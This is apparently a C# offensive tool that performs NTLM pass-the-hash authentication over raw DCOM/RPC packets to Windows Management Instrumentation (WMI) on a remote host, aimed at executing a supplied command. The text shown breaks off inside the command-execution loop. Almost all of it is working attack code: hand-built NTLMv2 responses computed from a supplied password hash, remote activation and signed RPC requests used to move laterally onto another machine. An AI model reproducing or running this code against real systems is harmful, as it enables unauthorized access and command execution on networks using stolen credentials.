using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace WMICmd
{
    class WMIRemoteCmd
    {
        private static string user;
        private static string pass;
        private static string rhost;
        private static string cmd;

        static void Main(string[] args)
        {
            user = args[0];
            pass = args[1];
            rhost = args[2];
            cmd = args[3];

            Execute();
        }

        private static void Execute()
        {
            try
            {
                Console.WriteLine("Executing with the following options:");
                Console.WriteLine("User: {0}", user);
                Console.WriteLine("Password: {0}", pass);
                Console.WriteLine("Remote Host: {0}", rhost);
                Console.WriteLine("Command: {0}", cmd);

                if (IsNTLM(pass))
                {
                    string targetShort = "";
                    string targetLong = "";

                    try
                    {
                        IPAddress ip = IPAddress.Parse(rhost);
                        targetShort = targetLong = rhost;
                    }
                    catch
                    {
                        targetLong = rhost;

                        if (rhost.Contains("."))
                            targetShort = rhost.Substring(0, rhost.IndexOf("."));
                        else
                            targetShort = rhost;
                    }

                    int processId = Process.GetCurrentProcess().Id;
                    string procIdStr = BitConverter.ToString(BitConverter.GetBytes(processId)).Replace("-00-00", "");
                    List<char> process = new List<char>();
                    foreach (string c in procIdStr.Split('-'))
                        process.Add((char)Convert.ToInt16(c,16));
                    byte[] processIdBytes = new byte[process.Count];
                    Buffer.BlockCopy(process.ToArray(), 0, processIdBytes, 0, process.Count);

                    TcpClient clientInit = new TcpClient();
                    clientInit.Client.ReceiveTimeout = 30000;
                    clientInit.Connect(rhost, 135);

                    if (clientInit.Connected)
                    {
                        NetworkStream streamInit = clientInit.GetStream();
                        byte[] clientReceive = new byte[2048];

                        byte[] rpcUuid = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
                        List<KeyValuePair<string,byte[]>> packetRpc = PacketRPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x02 }, new byte[] { 0x00, 0x00 }, rpcUuid, new byte[] { 0x00, 0x00 });
                        packetRpc[packetRpc.FindIndex(a => a.Key.Equals("FragLength"))] = new KeyValuePair<string, byte[]>("FragLength", new byte[] { 0x74, 0x00 });
                        byte[] rpc = ConvertFromSortedDictionary(packetRpc);

                        streamInit.Write(rpc, 0, rpc.Length);
                        streamInit.Flush();
                        streamInit.Read(clientReceive, 0, clientReceive.Length);

                        byte[] assocGroup = clientReceive.SubArray(20, 4); 

                        packetRpc = PacketRPCRequest(new byte[] { 0x03 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x05, 0x00 }, new byte[] { });
                        rpc = ConvertFromSortedDictionary(packetRpc);

                        streamInit.Write(rpc, 0, rpc.Length);
                        streamInit.Flush();
                        streamInit.Read(clientReceive, 0, clientReceive.Length);

                        byte[] hostnameUnicode = clientReceive.SubArray(42, clientReceive.Length - 43);
                        string hostname = BitConverter.ToString(hostnameUnicode);
                        int hostnameIndex = hostname.IndexOf("-00-00-00");
                        hostname = hostname.Substring(0, hostnameIndex);
                    
                        hostname = hostname.Replace("-00", "");
                        string[] splitHostname = hostname.Split('-');
                    
                        List<byte> host = new List<byte>();
                        foreach (string c in splitHostname)
                            host.Add((byte)Convert.ToInt16(c,16));
                        byte[] b = new byte[host.ToArray().Length];
                        Buffer.BlockCopy(host.ToArray(), 0, b, 0, host.ToArray().Length);

                        hostname = Encoding.ASCII.GetString(b);

                        if (!targetShort.Equals(hostname))
                            targetShort = hostname;
                        clientInit.Close();
                        streamInit.Close();
                        TcpClient client = new TcpClient();
                        client.Client.ReceiveTimeout = 30000;

                        try
                        {
                            client.Connect(targetLong, 135);
                        }
                        catch
                        {
                            Console.WriteLine("[-] " + rhost + " did not respond");
                        }

                        if (client.Connected)
                        {
                            NetworkStream stream = client.GetStream();
                            rpcUuid = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                            packetRpc = PacketRPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, rpcUuid, new byte[] { 0x00, 0x00 });

                            packetRpc[packetRpc.FindIndex(a => a.Key.Equals("FragLength"))] = new KeyValuePair<string, byte[]>("FragLength", new byte[] { 0x78, 0x00 });
                            packetRpc[packetRpc.FindIndex(a => a.Key.Equals("AuthLength"))] = new KeyValuePair<string, byte[]>("AuthLength", new byte[] { 0x28, 0x00 });
                            packetRpc[packetRpc.FindIndex(a => a.Key.Equals("NegotiateFlags"))] = new KeyValuePair<string, byte[]>("NegotiateFlags", new byte[] { 0x07, 0x82, 0x08, 0xa2 });

                            rpc = ConvertFromSortedDictionary(packetRpc);

                            stream.Write(rpc, 0, rpc.Length);
                            stream.Flush();
                            stream.Read(clientReceive, 0, clientReceive.Length);

                            assocGroup = clientReceive.SubArray(20, 4);
                            string ntlmSsp = BitConverter.ToString(clientReceive);
                            ntlmSsp = ntlmSsp.Replace("-", "");
                            int ntlmSspIndex = ntlmSsp.IndexOf("4E544C4D53535000");
                            int ntlmSspByteIndex = ntlmSspIndex / 2;
                            ushort domainLength = GetUInt16DataLength((ntlmSspByteIndex + 12), clientReceive);
                            ushort targetLength = GetUInt16DataLength((ntlmSspByteIndex + 40), clientReceive);
                            byte[] sessionID = clientReceive.SubArray(44, 8);
                        
                            byte[] ntlmChallenge = clientReceive.SubArray((ntlmSspByteIndex + 24), 8);
                            byte[] targetDetails = clientReceive.SubArray(ntlmSspByteIndex + 56 + domainLength, targetLength);
                            byte[] targetTimeBytes = targetDetails.SubArray((targetDetails.Length - 12), 8);
                            //The code below is repeated
                            string hashString = "";

                            for (int i = 0; i < pass.Length; i += 2)
                                hashString += pass.Substring(i, 2) + "-";
                            List<byte> hashShorts = new List<byte>();
                            foreach (string s in hashString.Trim('-').Split('-'))
                                hashShorts.Add((byte)Convert.ToInt16(s,16));
                            byte[] hashBytes = new byte[hashShorts.ToArray().Length];
                            Buffer.BlockCopy(hashShorts.ToArray(), 0, hashBytes, 0, hashShorts.ToArray().Length);

                            string[] domainUser = user.Split('\\');

                            byte[] hostBytes = Encoding.Unicode.GetBytes(Environment.MachineName);
                            byte[] domainBytes = Encoding.Unicode.GetBytes(domainUser[0]);
                            byte[] userBytes = Encoding.Unicode.GetBytes(domainUser[1]);

                            byte[] authDomainLength = BitConverter.GetBytes(domainBytes.Length).SubArray(0, 2);
                            byte[] authUserLength = BitConverter.GetBytes(userBytes.Length).SubArray(0, 2);
                            byte[] authHostnameLength = BitConverter.GetBytes(hostBytes.Length).SubArray(0, 2);
                            byte[] domainOffset = new byte[] { 0x40, 0x00, 0x00, 0x00 };

                            byte[] userOffset = BitConverter.GetBytes(domainBytes.Length + 64);
                            byte[] hostOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + 64);
                            byte[] lmOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + hostBytes.Length + 64);
                            byte[] ntlmOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + hostBytes.Length + 88);
                            HMACMD5 md5 = new HMACMD5() { Key = hashBytes };

                            string userTarget = domainUser[1].ToUpper();
                            byte[] userTargetBytesTmp = Encoding.Unicode.GetBytes(userTarget);
                            byte[] userTargetBytes = new byte[userTargetBytesTmp.Length + domainBytes.Length];
                            userTargetBytesTmp.CopyTo(userTargetBytes, 0);
                            domainBytes.CopyTo(userTargetBytes, userTargetBytesTmp.Length);
                            byte[] ntlmv2Hash = md5.ComputeHash(userTargetBytes);

                            Random rnd = new Random();
                            string clientChallenge = "";
                            for (int i = 1; i <= 8; i++)
                                clientChallenge += (string.Format("{0:x2}", rnd.Next(1, 255)) + " ");


                            List<byte> challengeShorts = new List<byte>();
                            foreach (string s in clientChallenge.Trim(' ').Split(' '))
                                challengeShorts.Add((byte)Convert.ToInt16(s,16));
                            byte[] clientChallengeBytes = new byte[challengeShorts.ToArray().Length];
                            Buffer.BlockCopy(challengeShorts.ToArray(), 0, clientChallengeBytes, 0, challengeShorts.Count);

                            List<byte> securityBlobBytesList = new List<byte>() { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                            securityBlobBytesList.AddRange(targetTimeBytes);
                            securityBlobBytesList.AddRange(clientChallengeBytes);
                            securityBlobBytesList.AddRange(new List<byte> { 0x00, 0x00, 0x00, 0x00 });
                            securityBlobBytesList.AddRange(targetDetails);
                            securityBlobBytesList.AddRange(new List<byte> { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                            byte[] securityBlobBytes = securityBlobBytesList.ToArray();

                            List<byte> serverChallengeSecurityBlobBytes = new List<byte>();
                            serverChallengeSecurityBlobBytes.AddRange(ntlmChallenge);
                            serverChallengeSecurityBlobBytes.AddRange(securityBlobBytes);
                            md5.Key = ntlmv2Hash;
                            byte[] ntlmv2Response1 = md5.ComputeHash(serverChallengeSecurityBlobBytes.ToArray());
                            byte[] sessionBaseKey = md5.ComputeHash(ntlmv2Response1);
                            // The code above is repeated

                            List<byte> ntlmv2Response2 = new List<byte>();
                            ntlmv2Response2.AddRange(ntlmv2Response1);
                            ntlmv2Response2.AddRange(securityBlobBytes);
                            byte[] ntlmv2Response2Length = BitConverter.GetBytes(ntlmv2Response2.ToArray().Length).SubArray(0, 2);
                            byte[] sessionKeyOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + hostBytes.Length + ntlmv2Response2Length.Length + 88);
                            byte[] sessionKeyLength = new byte[] { 0x00, 0x00 };
                            byte[] negotiateFlags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };

                            List<byte> ntlmSspResponse = new List<byte>() { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 };
                            ntlmSspResponse.AddRange(lmOffset);
                            ntlmSspResponse.AddRange(ntlmv2Response2Length);
                            ntlmSspResponse.AddRange(ntlmv2Response2Length);
                            ntlmSspResponse.AddRange(ntlmOffset);
                            ntlmSspResponse.AddRange(BitConverter.GetBytes(domainLength));
                            ntlmSspResponse.AddRange(BitConverter.GetBytes(domainLength));
                            ntlmSspResponse.AddRange(domainOffset);
                            ntlmSspResponse.AddRange(authUserLength);
                            ntlmSspResponse.AddRange(authUserLength);
                            ntlmSspResponse.AddRange(userOffset);
                            ntlmSspResponse.AddRange(authHostnameLength);
                            ntlmSspResponse.AddRange(authHostnameLength);
                            ntlmSspResponse.AddRange(hostOffset);
                            ntlmSspResponse.AddRange(sessionKeyLength);
                            ntlmSspResponse.AddRange(sessionKeyLength);
                            ntlmSspResponse.AddRange(sessionKeyOffset);
                            ntlmSspResponse.AddRange(negotiateFlags);
                            ntlmSspResponse.AddRange(domainBytes);
                            ntlmSspResponse.AddRange(userBytes);
                            ntlmSspResponse.AddRange(hostBytes);
                            ntlmSspResponse.AddRange(new List<byte>() { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                            ntlmSspResponse.AddRange(ntlmv2Response2);

                            assocGroup = clientReceive.SubArray(20, 4);
                        
                            packetRpc = PacketRPCAuth3(ntlmSspResponse.ToArray());
                            rpc = ConvertFromSortedDictionary(packetRpc);
                            stream.Write(rpc, 0, rpc.Length);
                            stream.Flush();

                            string causalityId = "";
                            for (int i = 1; i <= 16; i++)
                                causalityId += (string.Format("{0:x2}", rnd.Next(1, 255)) + " ");

                            List<byte> causalityIdShorts = new List<byte>();
                            foreach (string s in causalityId.Trim(' ').Split(' '))
                                causalityIdShorts.Add((byte)Convert.ToInt16(s,16));
                            byte[] causalityIdBytes = new byte[causalityIdShorts.ToArray().Length];
                            Buffer.BlockCopy(causalityIdShorts.ToArray(), 0, causalityIdBytes, 0, causalityIdShorts.ToArray().Length);

                            string unusedBuffer = "";
                            for (int i = 1; i <= 16; i++)
                                unusedBuffer += (string.Format("{0:x2}", rnd.Next(1, 255)) + " ");

                            List<byte> unusedBufferShorts = new List<byte>();
                            foreach (string s in unusedBuffer.Trim(' ').Split(' '))
                                unusedBufferShorts.Add((byte)Convert.ToInt16(s,16));
                            byte[] unusedBufferBytes = new byte[unusedBufferShorts.ToArray().Length];
                            Buffer.BlockCopy(unusedBufferShorts.ToArray(), 0, unusedBufferBytes, 0, unusedBufferShorts.ToArray().Length);

                            List<KeyValuePair<string,byte[]>> packetDcomRemoteCreateInstance = PacketDCOMRemoteCreateInstance(causalityIdBytes, targetShort);
                            byte[] dcomRemoteCreateInstance = ConvertFromSortedDictionary(packetDcomRemoteCreateInstance);

                            packetRpc = PacketRPCRequest(new byte[] { 0x03 }, dcomRemoteCreateInstance.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x01, 0x00 }, new byte[] { 0x04, 0x00 }, new byte[] { });
                            rpc = ConvertFromSortedDictionary(packetRpc);

                            List<byte> clientSendList = new List<byte>();
                            clientSendList.AddRange(rpc);
                            clientSendList.AddRange(dcomRemoteCreateInstance);
                            byte[] clientSend = clientSendList.ToArray();

                            stream.Write(clientSend, 0, clientSend.Length);
                            stream.Flush();
                            stream.Read(clientReceive, 0, clientReceive.Length);

                            TcpClient randomPortClient = new TcpClient();
                            randomPortClient.Client.ReceiveTimeout = 30000;
                            List<byte> objectUuid = new List<byte>();
                            List<byte> ipId = new List<byte>();
                            string oxIdStr = "";
                        
                            if (clientReceive[2] == 3 && BitConverter.ToString(clientReceive.SubArray(24, 4)) == "05-00-00-00")
                                Console.WriteLine("[-] WMI access denied on " + targetLong);
                            else if (clientReceive[2] == 3)
                                Console.WriteLine("[-] Error code 0x" + BitConverter.ToString(clientReceive.SubArray(27, -4)).Replace("-", ""));
                            else if (clientReceive[2] == 2)
                            {
                                Console.WriteLine(user + " accessed WMI on " + targetLong);

                                if (targetShort.Equals("127.0.0.1"))
                                    targetShort = hostname;

                                byte[] targetShortUni = Encoding.Unicode.GetBytes(targetShort + "[");
                                List<byte> targetUnicode = new List<byte>() { 0x07, 0x00 };
                                targetUnicode.AddRange(targetShortUni);
                                string targetSearch = BitConverter.ToString(targetUnicode.ToArray()).Replace("-", "");
                                string wmiMessage = BitConverter.ToString(clientReceive).Replace("-", "");
                                int targetIndex = wmiMessage.IndexOf(targetSearch);

                                if (targetIndex < 1)
                                {
                                    IPAddress[] targetAddressList = Dns.GetHostEntry(targetLong).AddressList;
                                    foreach (IPAddress ip in targetAddressList)
                                    {
                                        targetShort = ip.ToString();
                                        targetShortUni = Encoding.Unicode.GetBytes(targetShort + "[");
                                        targetUnicode = new List<byte>() { 0x07, 0x00 };
                                        targetUnicode.AddRange(targetShortUni);
                                        targetSearch = BitConverter.ToString(targetUnicode.ToArray()).Replace("-", "");
                                        targetIndex = wmiMessage.IndexOf(targetSearch);

                                        if (targetIndex > 0)
                                            break;
                                    }
                                }

                            int randomPortInt = 0;
                                if (targetIndex > 0)
                                {
                                    int targetBytesIndex = targetIndex / 2;
                                    byte[] randomPort = clientReceive.SubArray(targetBytesIndex + targetUnicode.ToArray().Length, 9);
                                    string randomPortStr = BitConverter.ToString(randomPort);
                                    int randomPortEndIndex = randomPortStr.IndexOf("-5D");

                                    if (randomPortEndIndex > 0)
                                        randomPortStr = randomPortStr.Substring(0, randomPortEndIndex);

                                    randomPortStr = randomPortStr.Replace("-00", "");

                                    List<byte> randomPortShorts = new List<byte>();
                                    foreach (string s in randomPortStr.Split('-'))
                                        randomPortShorts.Add((byte)Convert.ToInt16(s,16));
                                    byte[] randomPortBytes = new byte[randomPortShorts.ToArray().Length];
                                    Buffer.BlockCopy(randomPortShorts.ToArray(), 0, randomPortBytes, 0, randomPortShorts.ToArray().Length);

                                    string tmp = "";

                                    foreach (var v in randomPortBytes)
                                        tmp += Encoding.ASCII.GetString(new byte[] { v });

                                    randomPortInt = Convert.ToInt32(tmp);
                                    string meow = BitConverter.ToString(clientReceive).Replace("-", "");
                                    int meowIndex = meow.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820");
                                    int meowBytesIndex = meowIndex / 2;
                                    byte[] oxId = clientReceive.SubArray((meowBytesIndex + 32), 8);
                                    ipId.AddRange(clientReceive.SubArray((meowBytesIndex + 48), 16));
                                    oxIdStr = BitConverter.ToString(oxId).Replace("-", "");
                                    int oxIdIndex = meow.IndexOf(oxIdStr, meowIndex + 100);
                                    int oxIdBytesIndex = oxIdIndex / 2;
                                    objectUuid.AddRange(clientReceive.SubArray((oxIdBytesIndex + 12), 16));
                                }

                                if (randomPortInt != 0)
                                {
                                    try
                                    {
                                        Console.WriteLine("[*] Connecting to {0}:{1}", targetLong, randomPortInt);
                                        randomPortClient.Connect(targetLong, randomPortInt);
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[-] {0}:{1} did not respond", targetLong, randomPortInt);
                                    }
                                }
                                else
                                    Console.WriteLine("[-] Random port extraction failure");
                            }
                            else
                                Console.WriteLine("[-] Something went wrong");

                            if (randomPortClient.Connected)
                            {
                                Console.WriteLine("[*] Connected to {0}", targetLong);
                                NetworkStream randomPortStream = randomPortClient.GetStream();
                                packetRpc = PacketRPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }, new byte[] { 0x00, 0x00 });

                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("FragLength"))] = new KeyValuePair<string, byte[]>("FragLength", new byte[] { 0xd0, 0x00 });
                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("AuthLength"))] = new KeyValuePair<string, byte[]>("AuthLength", new byte[] { 0x28, 0x00 });
                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("AuthLevel"))] = new KeyValuePair<string, byte[]>("AuthLevel", new byte[] { 0x04 });
                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("NegotiateFlags"))] = new KeyValuePair<string, byte[]>("NegotiateFlags", new byte[] { 0x97, 0x82, 0x08, 0xa2 });

                                rpc = ConvertFromSortedDictionary(packetRpc);
                                randomPortStream.Write(rpc, 0, rpc.Length);
                                randomPortStream.Flush();
                                randomPortStream.Read(clientReceive, 0, clientReceive.Length);
                                assocGroup = clientReceive.SubArray(20, 4);
                                ntlmSsp = BitConverter.ToString(clientReceive).Replace("-", "");
                                ntlmSspIndex = ntlmSsp.IndexOf("4E544C4D53535000");
                                ntlmSspByteIndex = ntlmSspIndex / 2;
                                domainLength = GetUInt16DataLength((ntlmSspByteIndex + 12), clientReceive);
                                targetLength = GetUInt16DataLength((ntlmSspByteIndex + 40), clientReceive);
                                sessionID = clientReceive.SubArray(44, 8);
                                ntlmChallenge = clientReceive.SubArray((ntlmSspByteIndex + 24), 8);
                                targetDetails = clientReceive.SubArray((ntlmSspByteIndex + 56 + domainLength), targetLength);
                                targetTimeBytes = targetDetails.SubArray((targetDetails.Length - 12), 8);

                                //The code below is repeated from above
                                
                                hashString = "";

                                for (int i = 0; i < pass.Length; i += 2)
                                    hashString += pass.Substring(i, 2) + "-";

                                hashShorts = new List<byte>();
                                foreach (string s in hashString.Trim('-').Split('-'))
                                    hashShorts.Add((byte)Convert.ToInt16(s,16));
                                hashBytes = new byte[hashShorts.ToArray().Length];
                                Buffer.BlockCopy(hashShorts.ToArray(), 0, hashBytes, 0, hashShorts.ToArray().Length);
                                

                                hostBytes = Encoding.Unicode.GetBytes(Environment.MachineName);
                                domainBytes = Encoding.Unicode.GetBytes(domainUser[0]);
                                userBytes = Encoding.Unicode.GetBytes(domainUser[1]);

                                authDomainLength = BitConverter.GetBytes(domainBytes.Length).SubArray(0, 2);
                                authUserLength = BitConverter.GetBytes(userBytes.Length).SubArray(0, 2);
                                authHostnameLength = BitConverter.GetBytes(hostBytes.Length).SubArray(0, 2);
                                domainOffset = new byte[] { 0x40, 0x00, 0x00, 0x00 };

                                userOffset = BitConverter.GetBytes(domainBytes.Length + 64);
                                hostOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + 64);
                                lmOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + hostBytes.Length + 64);
                                ntlmOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + hostBytes.Length + 88);

                                md5 = new HMACMD5() { Key = hashBytes };

                                userTarget = domainUser[1].ToUpper();
                                userTargetBytesTmp = Encoding.Unicode.GetBytes(userTarget);
                                userTargetBytes = new byte[userTargetBytesTmp.Length + domainBytes.Length];
                                userTargetBytesTmp.CopyTo(userTargetBytes, 0);
                                domainBytes.CopyTo(userTargetBytes, userTargetBytesTmp.Length);
                                ntlmv2Hash = md5.ComputeHash(userTargetBytes);

                                rnd = new Random();
                                clientChallenge = "";
                                for (int i = 1; i <= 8; i++)
                                    clientChallenge += (string.Format("{0:x2}", rnd.Next(1, 255)) + " ");

                                challengeShorts = new List<byte>();
                                foreach (string s in clientChallenge.Trim(' ').Split(' '))
                                    challengeShorts.Add((byte)Convert.ToInt16(s,16));
                                clientChallengeBytes = new byte[challengeShorts.ToArray().Length];
                                Buffer.BlockCopy(challengeShorts.ToArray(), 0, clientChallengeBytes, 0, challengeShorts.ToArray().Length);

                                securityBlobBytesList = new List<byte>() { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                securityBlobBytesList.AddRange(targetTimeBytes);
                                securityBlobBytesList.AddRange(clientChallengeBytes);
                                securityBlobBytesList.AddRange(new List<byte> { 0x00, 0x00, 0x00, 0x00 });
                                securityBlobBytesList.AddRange(targetDetails);
                                securityBlobBytesList.AddRange(new List<byte> { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                securityBlobBytes = securityBlobBytesList.ToArray();


                                serverChallengeSecurityBlobBytes = new List<byte>();
                                serverChallengeSecurityBlobBytes.AddRange(ntlmChallenge);
                                serverChallengeSecurityBlobBytes.AddRange(securityBlobBytes);
                                md5.Key = ntlmv2Hash;
                                ntlmv2Response1 = md5.ComputeHash(serverChallengeSecurityBlobBytes.ToArray());
                                sessionBaseKey = md5.ComputeHash(ntlmv2Response1);
                                //The code above is repeated

                                byte[] clientSigningConstant = new byte[] { 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,
                                    0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,
                                    0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,
                                    0x6e,0x67,0x20,0x6b,0x65,0x79,0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,
                                    0x6e,0x73,0x74,0x61,0x6e,0x74,0x00 };

                                MD5CryptoServiceProvider md5Provider = new MD5CryptoServiceProvider();
                                List<byte> hashInput = new List<byte>();
                                hashInput.AddRange(sessionBaseKey);

                                hashInput.AddRange(clientSigningConstant);

                                byte[] clientSigningKey = md5Provider.ComputeHash(hashInput.ToArray());

                                //The code below is repeated
                                ntlmv2Response2 = new List<byte>();
                                ntlmv2Response2.AddRange(ntlmv2Response1);
                                ntlmv2Response2.AddRange(securityBlobBytes);
                                ntlmv2Response2Length = BitConverter.GetBytes(ntlmv2Response2.ToArray().Length).SubArray(0, 2);
                                sessionKeyOffset = BitConverter.GetBytes(domainBytes.Length + userBytes.Length + hostBytes.Length + ntlmv2Response2Length.Length + 88);
                                sessionKeyLength = new byte[] { 0x00, 0x00 };
                                negotiateFlags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };

                                ntlmSspResponse = new List<byte>() { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 };
                                ntlmSspResponse.AddRange(lmOffset);
                                ntlmSspResponse.AddRange(ntlmv2Response2Length);
                                ntlmSspResponse.AddRange(ntlmv2Response2Length);
                                ntlmSspResponse.AddRange(ntlmOffset);
                                ntlmSspResponse.AddRange(BitConverter.GetBytes(domainLength));
                                ntlmSspResponse.AddRange(BitConverter.GetBytes(domainLength));
                                ntlmSspResponse.AddRange(domainOffset);
                                ntlmSspResponse.AddRange(authUserLength);
                                ntlmSspResponse.AddRange(authUserLength);
                                ntlmSspResponse.AddRange(userOffset);
                                ntlmSspResponse.AddRange(authHostnameLength);
                                ntlmSspResponse.AddRange(authHostnameLength);
                                ntlmSspResponse.AddRange(hostOffset);
                                ntlmSspResponse.AddRange(sessionKeyLength);
                                ntlmSspResponse.AddRange(sessionKeyLength);
                                ntlmSspResponse.AddRange(sessionKeyOffset);
                                ntlmSspResponse.AddRange(negotiateFlags);
                                ntlmSspResponse.AddRange(domainBytes);
                                ntlmSspResponse.AddRange(userBytes);
                                ntlmSspResponse.AddRange(hostBytes);
                                ntlmSspResponse.AddRange(new List<byte>() { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                ntlmSspResponse.AddRange(ntlmv2Response2);
                                //The code above is repeated

                                md5.Key = clientSigningKey;
                                byte[] sequenceNum = new byte[] { 0x00, 0x00, 0x00, 0x00 };

                                packetRpc = PacketRPCAuth3(ntlmSspResponse.ToArray());

                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("CallID"))] = new KeyValuePair<string, byte[]>("CallID", new byte[] { 0x02, 0x00, 0x00, 0x00 });
                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("AuthLevel"))] = new KeyValuePair<string, byte[]>("AuthLevel", new byte[] { 0x04 });

                                rpc = ConvertFromSortedDictionary(packetRpc);

                                randomPortStream.Write(rpc, 0, rpc.Length);
                                randomPortStream.Flush();

                                packetRpc = PacketRPCRequest(new byte[] { 0x83 }, 76, 16, 4, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x03, 0x00 }, objectUuid.ToArray());
                                List<KeyValuePair<string,byte[]>> packetRemQueryInterface = PacketDCOMRemQueryInterface(causalityIdBytes, ipId.ToArray(), new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
                                List<KeyValuePair<string, byte[]>> packetNtlmSspVerifier = PacketNTLMSSPVerifier(4, new byte[] { 0x04 }, sequenceNum);
                                rpc = ConvertFromSortedDictionary(packetRpc);
                                byte[] remQueryInterface = ConvertFromSortedDictionary(packetRemQueryInterface);
                                byte[] ntlmSspVerifier = ConvertFromSortedDictionary(packetNtlmSspVerifier);

                                md5.Key = clientSigningKey;
                                hashInput.Clear();
                                hashInput.AddRange(sequenceNum);
                                hashInput.AddRange(rpc);
                                hashInput.AddRange(remQueryInterface);
                                hashInput.AddRange(ntlmSspVerifier.SubArray(0, 12));
                                byte[] rpcSignature = md5.ComputeHash(hashInput.ToArray()).SubArray(0, 8);

                                packetNtlmSspVerifier[packetNtlmSspVerifier.FindIndex(a => a.Key.Equals("NTLMSSPVerifierChecksum"))] = new KeyValuePair<string, byte[]>("NTLMSSPVerifierChecksum", rpcSignature);

                                ntlmSspVerifier = ConvertFromSortedDictionary(packetNtlmSspVerifier);
                                clientSendList.Clear();
                                clientSendList.AddRange(rpc);
                                clientSendList.AddRange(remQueryInterface);
                                clientSendList.AddRange(ntlmSspVerifier);

                                randomPortStream.Write(clientSendList.ToArray(), 0, clientSendList.ToArray().Length);
                                randomPortStream.Flush();
                                randomPortStream.Read(clientReceive, 0, clientReceive.Length);
                                string clientStage = "Exit";

                                byte[] objectUuid2 = new byte[0];

                                if (clientReceive[2] == 3 && BitConverter.ToString(clientReceive.SubArray(24, 4)) == "05-00-00-00")
                                    Console.WriteLine("[-] {0} WMI access denied on {1}", user, targetLong);
                                else if (clientReceive[2] == 3)
                                    Console.WriteLine("[-] Error code 0x{0}", BitConverter.ToString(clientReceive.SubArray(27, -4)).Replace("-", ""));
                                else if (clientReceive[2] == 2)
                                {
                                    string data = BitConverter.ToString(clientReceive).Replace("-", "");
                                    int oxIdIndex = data.IndexOf(oxIdStr);
                                    int oxIdBytesIndex = oxIdIndex / 2;
                                    objectUuid2 = clientReceive.SubArray((oxIdBytesIndex + 16), 16);

                                    clientStage = "AlterContext";
                                }
                                else
                                    Console.WriteLine("[-] Something went wrong");

                                Console.WriteLine("[*] Attempting command execution");
                                int requestSplitIndex = 5500;

                                bool requestSplit = false;

                                byte[] requestFlags = new byte[0];
                                int requestAuthPadding = 0;
                                byte[] requestCallId = new byte[0];
                                byte[] requestContextId = new byte[0];
                                byte[] requestOpNum = new byte[0];
                                byte[] requestUuid = new byte[0];
                                byte[] hostnameLength = new byte[0];
                                byte[] ipid2 = new byte[0];
                                int requestSplitStage = 0;
                                int requestSplitIndexTracker = 0;
                                int seqNumCounter = 0;
                                int requestLength = 0;

                                while (!clientStage.Equals("Exit"))
                                {
                                    if (clientReceive[2] == 3)
                                    {
                                        Console.WriteLine("[-] Failed with error code 0x{0}", BitConverter.ToString(clientReceive.SubArray(24, 4).Reverse().ToArray()).Replace("-", ""));
                                        clientStage = "Exit";
                                    }

                                switch (clientStage)
                                    {
